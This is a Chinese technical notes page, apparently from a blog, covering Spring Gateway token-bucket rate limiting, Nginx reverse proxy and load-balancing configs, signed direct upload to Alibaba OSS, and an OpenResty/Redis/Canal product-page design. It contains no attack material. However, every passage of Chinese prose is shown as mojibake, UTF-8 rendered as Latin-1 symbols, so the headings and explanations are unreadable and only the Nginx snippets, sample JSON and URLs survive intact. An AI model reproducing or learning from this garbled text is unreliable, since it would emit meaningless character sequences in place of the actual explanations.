<h3 id="ä»¤ç‰Œæ¡¶ç®—æ³•åŸç†"><a href="#ä»¤ç‰Œæ¡¶ç®—æ³•åŸç†" class="headerlink" title="ä»¤ç‰Œæ¡¶ç®—æ³•åŸç†"></a>ä»¤ç‰Œæ¡¶ç®—æ³•åŸç†</h3><p>SpringGatewayä¸­é‡‡ç”¨çš„æ˜¯ä»¤ç‰Œæ¡¶ç®—æ³•ï¼Œä»¤ç‰Œæ¡¶ç®—æ³•åŸç†ï¼š</p>
<ul>
<li>å‡†å¤‡ä¸€ä¸ªä»¤ç‰Œæ¡¶ï¼Œæœ‰å›ºå®šå®¹é‡ï¼Œä¸€èˆ¬ä¸ºæœåŠ¡å¹¶å‘ä¸Šé™</li>
<li>æŒ‰ç…§å›ºå®šé€Ÿç‡ï¼Œç”Ÿæˆä»¤ç‰Œå¹¶å­˜å…¥ä»¤ç‰Œæ¡¶ï¼Œå¦‚æœæ¡¶ä¸­ä»¤ç‰Œæ•°è¾¾åˆ°ä¸Šé™ï¼Œå°±ä¸¢å¼ƒä»¤ç‰Œã€‚</li>
<li>æ¯æ¬¡è¯·æ±‚è°ƒç”¨éœ€è¦å…ˆè·å–ä»¤ç‰Œï¼Œåªæœ‰æ‹¿åˆ°ä»¤ç‰Œï¼Œæ‰ç»§ç»­æ‰§è¡Œï¼Œå¦åˆ™é€‰æ‹©é€‰æ‹©ç­‰å¾…æˆ–è€…ç›´æ¥æ‹’ç»ã€‚</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149724.png" alt="image-20200108161959810"></p>
<h2 id="ribbonåšè´Ÿè½½å‡è¡¡"><a href="#ribbonåšè´Ÿè½½å‡è¡¡" class="headerlink" title="ribbonåšè´Ÿè½½å‡è¡¡"></a>ribbonåšè´Ÿè½½å‡è¡¡</h2><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p>5ä¸‡çš„å¹¶å‘è¿æ¥ï¼Œä¸€ä¸ªmasterï¼Œå¤šä¸ªworkerï¼Œworkerå¹²æ´»</p>
<h2 id="åå‘ä»£ç†åŸç†"><a href="#åå‘ä»£ç†åŸç†" class="headerlink" title="åå‘ä»£ç†åŸç†"></a>åå‘ä»£ç†åŸç†</h2><p>ä»€ä¹ˆæ˜¯åå‘ä»£ç†ï¼Ÿ</p>
<ul>
<li>ä»£ç†ï¼šé€šè¿‡å®¢æˆ·æœºçš„é…ç½®ï¼Œå®ç°è®©ä¸€å°æœåŠ¡å™¨ä»£ç†å®¢æˆ·æœºï¼Œå®¢æˆ·çš„æ‰€æœ‰è¯·æ±‚éƒ½äº¤ç»™ä»£ç†æœåŠ¡å™¨å¤„ç†ã€‚</li>
<li>åå‘ä»£ç†ï¼šç”¨ä¸€å°æœåŠ¡å™¨ï¼Œä»£ç†çœŸå®æœåŠ¡å™¨ï¼Œç”¨æˆ·è®¿é—®æ—¶ï¼Œä¸å†æ˜¯è®¿é—®çœŸå®æœåŠ¡å™¨ï¼Œè€Œæ˜¯ä»£ç†æœåŠ¡å™¨ã€‚</li>
</ul>
<p>nginxå¯ä»¥å½“åšåå‘ä»£ç†æœåŠ¡å™¨æ¥ä½¿ç”¨ï¼š</p>
<ul>
<li>æˆ‘ä»¬éœ€è¦æå‰åœ¨nginxä¸­é…ç½®å¥½åå‘ä»£ç†çš„è§„åˆ™ï¼Œä¸åŒçš„è¯·æ±‚ï¼Œäº¤ç»™ä¸åŒçš„çœŸå®æœåŠ¡å™¨å¤„ç†</li>
<li>å½“è¯·æ±‚åˆ°è¾¾nginxï¼Œnginxä¼šæ ¹æ®å·²ç»å®šä¹‰çš„è§„åˆ™è¿›è¡Œè¯·æ±‚çš„è½¬å‘ï¼Œä»è€Œå®ç°è·¯ç”±åŠŸèƒ½</li>
</ul>
<p>åˆ©ç”¨åå‘ä»£ç†ï¼Œå°±å¯ä»¥è§£å†³æˆ‘ä»¬å‰é¢æ‰€è¯´çš„ç«¯å£é—®é¢˜ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149725.png" alt="image-20200111175118787"></p>
<h2 id="è´Ÿè½½å‡è¡¡ï¼ˆäº†è§£ï¼‰"><a href="#è´Ÿè½½å‡è¡¡ï¼ˆäº†è§£ï¼‰" class="headerlink" title="è´Ÿè½½å‡è¡¡ï¼ˆäº†è§£ï¼‰"></a>è´Ÿè½½å‡è¡¡ï¼ˆäº†è§£ï¼‰</h2><p>æˆ‘ä»¬çš„nginxåå‘ä»£ç†ï¼Œç›®æ ‡æœåŠ¡å™¨åœ°å€æ˜¯é€šè¿‡IPå’ŒPortæ¥æŒ‡å®šï¼Œé‚£ä¹ˆæ–°çš„é—®é¢˜æ¥äº†ï¼š</p>
<p>å¦‚æœæˆ‘ä»¬çš„<code>leyou-manage</code>ä¸æ˜¯å•èŠ‚ç‚¹ï¼Œè€Œæ˜¯ä¸€ä¸ªæœåŠ¡é›†ç¾¤ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149726.png" alt="image-20200113094533555"></p>
<h3 id="è´Ÿè½½å‡è¡¡è½®è¯¢ç­–ç•¥"><a href="#è´Ÿè½½å‡è¡¡è½®è¯¢ç­–ç•¥" class="headerlink" title="è´Ÿè½½å‡è¡¡è½®è¯¢ç­–ç•¥"></a>è´Ÿè½½å‡è¡¡è½®è¯¢ç­–ç•¥</h3><p>é¦–å…ˆå®šä¹‰è´Ÿè½½å‡è¡¡çš„é›†ç¾¤èŠ‚ç‚¹ä¿¡æ¯ï¼ŒåŠè´Ÿè½½å‡è¡¡çš„ç­–ç•¥ï¼Œé»˜è®¤ç­–ç•¥æ˜¯è½®è¯¢ï¼Œé¡¾åæ€ä¹‰ï¼Œæ‰€æœ‰è¯·æ±‚éƒ½æŒ‰ç…§æ—¶é—´é¡ºåºåˆ†é…åˆ°ä¸åŒçš„æœåŠ¡ä¸Šï¼Œå¦‚æœæœåŠ¡Downæ‰ï¼Œå¯ä»¥è‡ªåŠ¨å‰”é™¤ï¼Œæœ¬ä¾‹ä¸­é…ç½®å››ä¸ªèŠ‚ç‚¹è½®è¯¢ï¼š</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è´Ÿè½½å‡è¡¡é…ç½®ï¼Œé»˜è®¤æ˜¯è½®è¯¢</span></span><br><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9003</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9004</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶ååœ¨åå‘ä»£ç†æ—¶ä¸è¦æŒ‡å‘å…·ä½“IPï¼Œè€Œæ˜¯è¿™é‡Œé…ç½®çš„ï¼š<code>leyou-manage</code>ã€‚</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">	<span class="attribute">listen</span>       <span class="number">80</span>;</span><br><span class="line">	<span class="attribute">server_name</span>  manage.leyou.com;</span><br><span class="line">	</span><br><span class="line">	<span class="section">location</span> / &#123;</span><br><span class="line">	    <span class="attribute">proxy_pass</span>   http://leyou-manage;</span><br><span class="line">		<span class="attribute">proxy_connect_timeout</span> <span class="number">600</span>;</span><br><span class="line">		<span class="attribute">proxy_read_timeout</span> <span class="number">5000</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="åŠ æƒè½®è¯¢"><a href="#åŠ æƒè½®è¯¢" class="headerlink" title="åŠ æƒè½®è¯¢"></a>åŠ æƒè½®è¯¢</h3><p>æŒ‡å®šæ¯ä¸ªæœåŠ¡çš„æƒé‡æ¯”ä¾‹ï¼Œweightå’Œè®¿é—®æ¯”ç‡æˆæ­£æ¯”ï¼Œé€šå¸¸ç”¨äºåç«¯æœåŠ¡æœºå™¨æ€§èƒ½ä¸ç»Ÿä¸€ï¼Œå°†æ€§èƒ½å¥½çš„åˆ†é…æƒé‡é«˜æ¥å‘æŒ¥æœåŠ¡å™¨æœ€å¤§æ€§èƒ½ï¼Œå¦‚ä¸‹é…ç½®å9001æœåŠ¡çš„è®¿é—®æ¯”ç‡ä¼šæ˜¯9002æœåŠ¡çš„äºŒå€ã€‚</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="comment"># è´Ÿè½½å‡è¡¡é…ç½®ï¼Œé»˜è®¤æ˜¯è½®è¯¢</span></span><br><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span> weight=<span class="number">1</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span> weight=<span class="number">2</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="IPå“ˆå¸Œ"><a href="#IPå“ˆå¸Œ" class="headerlink" title="IPå“ˆå¸Œ"></a>IPå“ˆå¸Œ</h3><p>æ¯ä¸ªè¯·æ±‚éƒ½æ ¹æ®è®¿é—®ipçš„hashç»“æœåˆ†é…ï¼Œç»è¿‡è¿™æ ·çš„å¤„ç†ï¼Œæ¯ä¸ªè®¿å®¢å›ºå®šè®¿é—®ä¸€ä¸ªåç«¯æœåŠ¡</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span>  leyou-manage &#123;</span><br><span class="line">    ip_hash; </span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="æœ€å°‘è¿æ¥"><a href="#æœ€å°‘è¿æ¥" class="headerlink" title="æœ€å°‘è¿æ¥"></a>æœ€å°‘è¿æ¥</h3><p>å°†è¯·æ±‚åˆ†é…åˆ°è¿æ¥æ•°æœ€å°‘çš„æœåŠ¡ä¸Šã€‚</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span> leyou-manage&#123;</span><br><span class="line">    least_conn;</span><br><span class="line">	<span class="attribute">server</span>	<span class="number">127.0.0.1:9001</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">    <span class="attribute">server</span>	<span class="number">127.0.0.1:9002</span>; <span class="comment"># èŠ‚ç‚¹ä¿¡æ¯</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ä½œä¸ºå›¾ç‰‡æœåŠ¡å™¨"><a href="#ä½œä¸ºå›¾ç‰‡æœåŠ¡å™¨" class="headerlink" title="ä½œä¸ºå›¾ç‰‡æœåŠ¡å™¨"></a>ä½œä¸ºå›¾ç‰‡æœåŠ¡å™¨</h2><p>å°†imagesæ”¾å…¥htmlç›®å½•ä¸‹,é€šè¿‡images.leyou.comè®¿é—®å›¾ç‰‡æœåŠ¡å™¨,å¯ä»¥é€šè¿‡é…ç½®å¼€å¯sendfileç³»ç»Ÿè°ƒç”¨, é›¶æ‹·è´;</p>
<h1 id="ä¸Šä¼ æ–‡ä»¶åˆ°OSS"><a href="#ä¸Šä¼ æ–‡ä»¶åˆ°OSS" class="headerlink" title="ä¸Šä¼ æ–‡ä»¶åˆ°OSS"></a>ä¸Šä¼ æ–‡ä»¶åˆ°OSS</h1><h2 id="ä¼ ç»Ÿæ–¹å¼"><a href="#ä¼ ç»Ÿæ–¹å¼" class="headerlink" title="ä¼ ç»Ÿæ–¹å¼"></a>ä¼ ç»Ÿæ–¹å¼</h2><p>æˆ‘ä»¬å¯ä»¥ç›´æ¥ä½¿ç”¨javaä»£ç æ¥å®ç°æŠŠå›¾ç‰‡ä¸Šä¼ åˆ°OSSï¼Œä¸è¿‡è¿™æ ·ä»¥æ¥æ–‡ä»¶ä¼šå…ˆä»å®¢æˆ·ç«¯æµè§ˆå™¨ä¸Šä¼ åˆ°æˆ‘ä»¬çš„æœåŠ¡ç«¯tomcatï¼Œç„¶åå†ä¸Šä¼ åˆ°OSSï¼Œæ•ˆç‡è¾ƒä½ï¼Œå¦‚å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149727.png" alt="1552311281042"></p>
<p>ä»¥ä¸Šæ–¹æ³•æœ‰ä¸‰ä¸ªç¼ºç‚¹ï¼š</p>
<ul>
<li>ä¸Šä¼ æ…¢ã€‚å…ˆä¸Šä¼ åˆ°åº”ç”¨æœåŠ¡å™¨ï¼Œå†ä¸Šä¼ åˆ°OSSï¼Œç½‘ç»œä¼ é€æ¯”ç›´ä¼ åˆ°OSSå¤šäº†ä¸€å€ã€‚å¦‚æœç›´ä¼ åˆ°OSSï¼Œä¸é€šè¿‡åº”ç”¨æœåŠ¡å™¨ï¼Œé€Ÿåº¦å°†å¤§å¤§æå‡ï¼Œè€Œä¸”OSSé‡‡ç”¨BGPå¸¦å®½ï¼Œèƒ½ä¿è¯å„åœ°å„è¿è¥å•†çš„é€Ÿåº¦ã€‚</li>
<li>æ‰©å±•æ€§å·®ã€‚å¦‚æœåç»­ç”¨æˆ·å¤šäº†ï¼Œåº”ç”¨æœåŠ¡å™¨ä¼šæˆä¸ºç“¶é¢ˆã€‚</li>
<li>è´¹ç”¨é«˜ã€‚éœ€è¦å‡†å¤‡å¤šå°åº”ç”¨æœåŠ¡å™¨ã€‚ç”±äºOSSä¸Šä¼ æµé‡æ˜¯å…è´¹çš„ï¼Œå¦‚æœæ•°æ®ç›´ä¼ åˆ°OSSï¼Œä¸é€šè¿‡åº”ç”¨æœåŠ¡å™¨ï¼Œé‚£ä¹ˆå°†èƒ½çœä¸‹å‡ å°åº”ç”¨æœåŠ¡å™¨ã€‚</li>
</ul>
<h2 id="webå‰ç«¯ç­¾ååç›´ä¼ "><a href="#webå‰ç«¯ç­¾ååç›´ä¼ " class="headerlink" title="webå‰ç«¯ç­¾ååç›´ä¼ "></a>webå‰ç«¯ç­¾ååç›´ä¼ </h2><p>å®¢æˆ·ç«¯é€šè¿‡JavaScriptä»£ç å®Œæˆç­¾åï¼Œç„¶åé€šè¿‡è¡¨å•ç›´ä¼ æ•°æ®åˆ°OSSã€‚æ— éœ€è®¿é—®åº”ç”¨æœåŠ¡å™¨ï¼Œå¯¹åº”ç”¨æœåŠ¡å™¨å‹åŠ›è¾ƒä½ã€‚</p>
<p>æµç¨‹å›¾å¦‚ä¸‹ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149728.png" alt="image-20200127125730699"></p>
<ul>
<li>JavaScriptå®¢æˆ·ç«¯ç­¾åç›´ä¼ ï¼š<ul>
<li>ä¼˜ç‚¹ï¼šåœ¨å®¢æˆ·ç«¯é€šè¿‡JavaScriptä»£ç å®Œæˆç­¾åï¼Œæ— éœ€è¿‡å¤šé…ç½®ï¼Œå³å¯å®ç°ç›´ä¼ ï¼Œéå¸¸æ–¹ä¾¿ã€‚</li>
<li>é—®é¢˜ï¼šå®¢æˆ·ç«¯é€šè¿‡JavaScriptæŠŠAccesssKeyID å’ŒAccessKeySecretå†™åœ¨ä»£ç é‡Œé¢æœ‰æ³„éœ²çš„é£é™©</li>
</ul>
</li>
</ul>
<h2 id="æœåŠ¡ç«¯ç­¾ååç›´ä¼ æµç¨‹"><a href="#æœåŠ¡ç«¯ç­¾ååç›´ä¼ æµç¨‹" class="headerlink" title="æœåŠ¡ç«¯ç­¾ååç›´ä¼ æµç¨‹"></a>æœåŠ¡ç«¯ç­¾ååç›´ä¼ æµç¨‹</h2><p>æœåŠ¡ç«¯ç­¾ååç›´ä¼ çš„åŸç†å¦‚ä¸‹ï¼š</p>
<ol>
<li>ç”¨æˆ·å‘é€ä¸Šä¼ Policyè¯·æ±‚åˆ°åº”ç”¨æœåŠ¡å™¨ï¼ˆæˆ‘ä»¬çš„å¾®æœåŠ¡ï¼‰ã€‚</li>
<li>åº”ç”¨æœåŠ¡å™¨è¿”å›ä¸Šä¼ Policyå’Œç­¾åç»™ç”¨æˆ·ã€‚</li>
<li>ç”¨æˆ·ç›´æ¥ä¸Šä¼ æ•°æ®åˆ°OSSã€‚</li>
</ol>
<p>æµç¨‹å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149729.png" alt="1552311833528"></p>
<ul>
<li>æœåŠ¡ç«¯ç­¾åï¼ŒJavaScriptå®¢æˆ·ç«¯ç›´ä¼ ï¼š<ul>
<li>ä¼˜ç‚¹ï¼šWebç«¯å‘æœåŠ¡ç«¯è¯·æ±‚ç­¾åï¼Œç„¶åç›´æ¥ä¸Šä¼ ï¼Œä¸ä¼šå¯¹æœåŠ¡ç«¯äº§ç”Ÿå‹åŠ›ï¼Œè€Œä¸”å®‰å…¨å¯é </li>
<li>é—®é¢˜ï¼šæœåŠ¡ç«¯æ— æ³•å®æ—¶äº†è§£ç”¨æˆ·ä¸Šä¼ äº†å¤šå°‘æ–‡ä»¶ï¼Œä¸Šä¼ äº†ä»€ä¹ˆæ–‡ä»¶</li>
</ul>
</li>
</ul>
<p>åœ¨é¡µé¢ç‚¹å‡»ä¸Šä¼ çš„æŒ‰é’®ï¼Œå¯ä»¥çœ‹åˆ°è¯·æ±‚å·²ç»å‘å‡ºï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149730.png" alt="image-20200127132348077"> </p>
<p>è¿™æ­£æ˜¯åœ¨å‘æœåŠ¡ç«¯ç”³è¯·ç­¾åï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦åœ¨æœåŠ¡ç«¯æ¥æ”¶è¯·æ±‚ï¼Œç”Ÿæˆç­¾åå¹¶è¿”å›ã€‚</p>
<p>æˆ‘ä»¬è¦åšçš„äº‹æƒ…åŒ…æ‹¬ï¼š</p>
<ul>
<li>æ­å»ºå¾®æœåŠ¡</li>
<li>åœ¨å¾®æœåŠ¡ä¸­ï¼Œæä¾›ä¸€ä¸ªæ¥å£ï¼Œç”Ÿæˆæ–‡ä»¶ä¸Šä¼ éœ€è¦çš„ç­¾å<ul>
<li>åˆ†ææ¥å£å£°æ˜ï¼Œåˆ†æè¯·æ±‚æ–¹å¼ã€è¯·æ±‚è·¯å¾„ã€è¯·æ±‚å‚æ•°ã€è¿”å›å€¼ç±»å‹</li>
<li>å®ç°ä¸šåŠ¡ï¼Œç”Ÿæˆç­¾å<ul>
<li>æŠŠä¸€äº›å¸¸é‡é…ç½®åˆ°ymlæ–‡ä»¶</li>
<li>ç¼–å†™ç±»ï¼Œè¯»å–è¿™äº›å±æ€§</li>
<li>æŠŠOSSå®¢æˆ·ç«¯æ³¨å…¥åˆ°springå®¹å™¨</li>
<li>ç¼–å†™ä¸šåŠ¡ï¼Œå®ç°ç­¾åçš„ç”Ÿæˆ</li>
<li>è§£å†³è·¨åŸŸé—®é¢˜(åœ¨é˜¿é‡Œäº‘OSSä¸Šè®¾ç½®)</li>
</ul>
</li>
</ul>
</li>
<li>å‰ç«¯ï¼Œè°ƒç”¨æˆ‘ä»¬çš„æ¥å£ï¼Œè·å–ç­¾åï¼ˆå·²å®Œæˆï¼‰</li>
<li>å‰ç«¯ï¼Œæºå¸¦ç­¾åï¼Œå®Œæˆä¸Šä¼ ï¼ˆå·²å®Œæˆï¼‰</li>
</ul>
<p>ç­¾åè¿”å›å€¼</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;accessId&quot;</span><span class="punctuation">:</span><span class="string">&quot;6MKO******4AUk44&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://post-test.oss-cn-hangzhou.aliyuncs.com&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;policy&quot;</span><span class="punctuation">:</span><span class="string">&quot;eyJleHBpcmF0aW9uIjoiMjAxNS0xMS0wNVQyMDo1Mjoy******Jjdb25kaXRpb25zIjpbWyJjdb250ZW50LWxlbmd0aC1yYW5nZSIsMCwxMDQ4NTc2MDAwXSxbInN0YXJ0cy13aXRoIiwiJGtleSIsInVzZXItZGlyXC8iXV19&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;signature&quot;</span><span class="punctuation">:</span><span class="string">&quot;VsxOcOudx******z93CLaXPz+4s=&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;expire&quot;</span><span class="punctuation">:</span><span class="number">1446727949</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;dir&quot;</span><span class="punctuation">:</span><span class="string">&quot;user-dirs/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>è¯¦ç»†è§£é‡Šï¼š</p>
<ul>
<li><code>accessId</code>ï¼šç”¨æˆ·çš„AccessKeyId</li>
<li><code>host</code>ï¼šç”³è¯·çš„é˜¿é‡ŒOSSçš„bucketè®¿é—®åœ°å€</li>
<li><code>policy</code>ï¼šæ–‡ä»¶ä¸Šä¼ çš„ç­–ç•¥ï¼Œä¸»è¦åŒ…å«å¯¹ä¸Šä¼ æ–‡ä»¶çš„è¦æ±‚ï¼Œåˆ©ç”¨Base64åŠ å¯†åè¿”å›ï¼Œ<a href="https://help.aliyun.com/document_detail/31988.html?spm=a2c4g.11186623.2.22.58cd7eaer5eXWw#section-d5z-1ww-wdb">è¯´æ˜æ–‡æ¡£</a></li>
<li><code>signature</code>ï¼šç”Ÿæˆçš„ç­¾å</li>
<li><code>expire</code>ï¼šæœ¬æ¬¡ç­¾åçš„è¿‡æœŸæ—¶é—´ï¼Œå®¢æˆ·ç«¯å¯ä»¥æ¢æˆç­¾åï¼Œåœ¨æœ‰æ•ˆæœŸå†…æ— éœ€å†æ¬¡ç­¾å</li>
<li><code>dir</code>ï¼šè¦ä¸Šä¼ åˆ°bucketä¸­çš„å“ªä¸ªç›®å½•</li>
</ul>
<p>ä½¿ç”¨HmacSHA256ç­¾å,ç”¨æˆ·ç”³è¯·åæˆæƒå¾®æœåŠ¡å°†è¿™ä¸ªå‘ç»™å®¢æˆ·ç«¯,å®¢æˆ·ç«¯å°†è¿™ä¸ªå’Œå›¾ç‰‡å‘ç»™é˜¿é‡Œäº‘,é˜¿é‡Œäº‘éªŒè¯åå°±å¯ä»¥ä¸Šä¼ äº†.é˜¿é‡ŒæœåŠ¡å™¨å°†æˆ‘ä»¬çš„ç”¨æˆ‘ä»¬çš„ç§é’¥ç„¶åç”¨åŒæ ·çš„ç®—æ³•ç®—å‡ºç­¾åæ¥éªŒè¯.</p>
<h1 id="å•†å“è¯¦æƒ…é¡µ"><a href="#å•†å“è¯¦æƒ…é¡µ" class="headerlink" title="å•†å“è¯¦æƒ…é¡µ"></a>å•†å“è¯¦æƒ…é¡µ</h1><ul>
<li>å¦‚ä½•åšåˆ°åŠ¨æ€å“åº”éœ€æ±‚å˜åŒ–ï¼Œé¡µé¢å˜åŒ–ï¼Ÿ<ul>
<li>å°†é¡µé¢æ¨¡æ¿åŠ¨æ€åŒ–ï¼Œéœ€è¦çš„æ•°æ®é™æ€åŒ–</li>
</ul>
</li>
<li>å¦‚ä½•é¿å…æ•´ä¸ªé¡µé¢çš„å…¨é‡æ›´æ–°ï¼Ÿ<ul>
<li>æˆ‘ä»¬æŠŠé¡µé¢åˆ†æˆå‡ éƒ¨åˆ†ï¼šå¦‚é¡¶éƒ¨é¢åŒ…å±‘ã€å•†å“SKUå±•ç¤ºã€å•†å“æè¿°ã€å•†å“è¯„è®ºç­‰ï¼Œå½¢æˆå¤šä¸ªé¡µé¢æ¨¡æ¿ï¼ˆæ¨¡å—ï¼‰ã€‚å¯¹åº”çš„æ•°æ®ä¹Ÿåˆ†æˆå‡ éƒ¨åˆ†ï¼Œè¿™äº›æ•°æ®å¯èƒ½æ¥è‡ªä¸åŒçš„å¾®æœåŠ¡ã€‚è¿™æ ·å¯ä»¥å‡å°‘å› å±€éƒ¨å˜æ›´å¼•èµ·çš„æ•´ä¸ªé¡µé¢é‡æ–°ç”Ÿæˆã€‚</li>
</ul>
</li>
<li>å¦‚ä½•åº”å¯¹Tomcatçš„å¹¶å‘èƒ½åŠ›ä½é—®é¢˜ï¼Ÿ<ul>
<li>å°†æ¨¡æ¿æ¸²æŸ“ã€æ•°æ®æ”¾åˆ°nginxä¸­åšï¼Œåˆ©ç”¨nginxçš„é«˜å¹¶å‘èƒ½åŠ›æé«˜ç³»ç»Ÿååé‡</li>
</ul>
</li>
<li>å¦‚ä½•å®ç°æ•°æ®é™æ€åŒ–ï¼Ÿ<ul>
<li>éœ€è¦çš„æ•°æ®å¯ä»¥ç¼“å­˜åœ¨Nginxçš„æœ¬åœ°å…±äº«è¯å…¸ä¸­ï¼ˆé•¿æœŸä¸ä¼šä¿®æ”¹çš„æ•°æ®ï¼‰ï¼Œå¦‚æœå‘½ä¸­åˆ™ç›´æ¥æ¸²æŸ“å¹¶è¿”å›ã€‚å¦‚æœæœªå‘½ä¸­ï¼Œåˆ™æŸ¥è¯¢Redisé›†ç¾¤ï¼Œè·å–æ•°æ®ã€‚å¦‚æœRedisé›†ç¾¤ä¾ç„¶æœªå‘½ä¸­ï¼Œå†å»æŸ¥è¯¢åå°å¾®æœåŠ¡ï¼Œç”±å¾®æœåŠ¡è·å–æ•°æ®ï¼Œç„¶åå†™å…¥ç¼“å­˜ä¸­ï¼Œä¿è¯ä¸‹æ¬¡Nginxå¯ä»¥ä»ç¼“å­˜ä¸­æ‹¿åˆ°æ•°æ®ã€‚è¿™æ ·å¯ä»¥å‡å°‘æœåŠ¡ç«¯å‹åŠ›ã€‚</li>
</ul>
</li>
<li>å¦‚ä½•ä¿è¯æ•°æ®ä¸€è‡´æ€§ï¼Ÿ<ul>
<li>ä¸ºäº†ä¿è¯Redisæ•°æ®ä¸æ•°æ®åº“æ•°æ®ä¸€è‡´ï¼Œæˆ‘ä»¬è¿˜è¦ç”¨åˆ°CanalæŠ€æœ¯ï¼Œç›‘å¬æ•°æ®åº“å˜åŒ–ï¼ŒåŠæ—¶æ›´æ–°Redisæ•°æ®ã€‚</li>
</ul>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212149731.png" alt="image-20210427235728804"></p>
<p>å› æ­¤ï¼Œæˆ‘ä»¬éœ€è¦åšçš„äº‹æƒ…åŒ…æ‹¬ï¼š</p>
<ul>
<li>é™æ€é¡µæ•°æ®æœåŠ¡ï¼šä¸€ä¸ªæ”¶é›†å•†å“ç›¸å…³æ•°æ®ï¼Œå¹¶æ›´æ–°Redisç¼“å­˜çš„æ•°æ®æœåŠ¡</li>
<li>NginxæœåŠ¡ï¼šæ¥æ”¶ç”¨æˆ·è¯·æ±‚ï¼ŒæŸ¥è¯¢æ¨¡æ¿æ•°æ®ï¼Œåˆ©ç”¨æ¨¡æ¿æ¸²æŸ“å•†å“é¡µé¢</li>
<li>CanalæœåŠ¡ï¼šç›‘å¬æ•°æ®åº“å˜åŒ–ï¼ŒåŒæ­¥é€šçŸ¥é™æ€é¡µæ•°æ®æœåŠ¡ï¼Œæ›´æ–°Redisæ•°æ®</li>
</ul>
<p>OpenRestyÂ® æ˜¯ä¸€ä¸ªåŸºäº <a href="http://openresty.org/cn/nginx.html">Nginx</a> ä¸ Lua çš„é«˜æ€§èƒ½ Web å¹³å°ï¼Œå…¶å†…éƒ¨é›†æˆäº†å¤§é‡ç²¾è‰¯çš„ Lua åº“ã€ç¬¬ä¸‰æ–¹æ¨¡å—ä»¥åŠå¤§å¤šæ•°çš„ä¾èµ–é¡¹ã€‚ç”¨äºæ–¹ä¾¿åœ°æ­å»ºèƒ½å¤Ÿå¤„ç†è¶…é«˜å¹¶å‘ã€æ‰©å±•æ€§æé«˜çš„åŠ¨æ€ Web åº”ç”¨ã€Web æœåŠ¡å’ŒåŠ¨æ€ç½‘å…³ã€‚</p>
